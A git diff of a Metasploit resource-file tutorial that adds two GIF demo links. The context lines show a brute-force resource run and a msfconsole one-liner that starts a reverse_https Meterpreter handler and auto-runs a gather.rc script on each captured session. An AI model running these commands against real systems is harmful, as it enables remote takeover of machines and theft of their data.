@@ -177,6 +177,8 @@
 
      `[run]` msfconsole -r /root/http_brute.rc
 
+![gif](http://i66.tinypic.com/2edmtrb.gif)
+
 <br />
 
 #### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)
@@ -217,6 +219,8 @@
 <blockquote>The easy way to reproduce this is: execute one multi/handler with the 'AutoRunScript' flag executing @darkoperator 'multi_console_command' script with the -rc argument pointing to the absoluct path of our gather.rc script. That will execute our gather.rc (auto-running our resource script automatically at session creation).</blockquote>
 
       sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD windows/meterpreter/reverse_https; set AutoRunScript multi_console_command -rc /root/gather.rc; exploit'
+
+![gif](http://i63.tinypic.com/dmxp93.gif)
 
 <br />
 
